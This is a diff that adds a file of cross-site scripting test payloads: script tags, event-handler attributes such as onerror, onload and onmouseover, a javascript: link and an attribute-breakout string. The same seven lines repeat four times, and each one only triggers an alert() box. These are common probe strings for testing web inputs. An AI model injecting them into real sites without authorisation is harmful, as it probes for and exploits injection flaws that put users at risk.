@@ -1,0 +1,28 @@
+<script>alert('XSS')</script>
+<img src="invalid.jpg" onerror="alert('XSS Custom Check :)))))---')">
+<div onmouseover="alert('XSS')">Hover Me</div>
+<a href="javascript:alert('XSS')">Click Me</a>
+<body onload="alert('XSS')">
+"><script>alert('XSS')</script>
+<svg/onload=alert('XSS bye ------------')>
+<script>alert('XSS')</script>
+<img src="invalid.jpg" onerror="alert('XSS Custom Check :)))))---')">
+<div onmouseover="alert('XSS')">Hover Me</div>
+<a href="javascript:alert('XSS')">Click Me</a>
+<body onload="alert('XSS')">
+"><script>alert('XSS')</script>
+<svg/onload=alert('XSS bye ------------')>
+<script>alert('XSS')</script>
+<img src="invalid.jpg" onerror="alert('XSS Custom Check :)))))---')">
+<div onmouseover="alert('XSS')">Hover Me</div>
+<a href="javascript:alert('XSS')">Click Me</a>
+<body onload="alert('XSS')">
+"><script>alert('XSS')</script>
+<svg/onload=alert('XSS bye ------------')>
+<script>alert('XSS')</script>
+<img src="invalid.jpg" onerror="alert('XSS Custom Check :)))))---')">
+<div onmouseover="alert('XSS')">Hover Me</div>
+<a href="javascript:alert('XSS')">Click Me</a>
+<body onload="alert('XSS')">
+"><script>alert('XSS')</script>
+<svg/onload=alert('XSS bye ------------')>
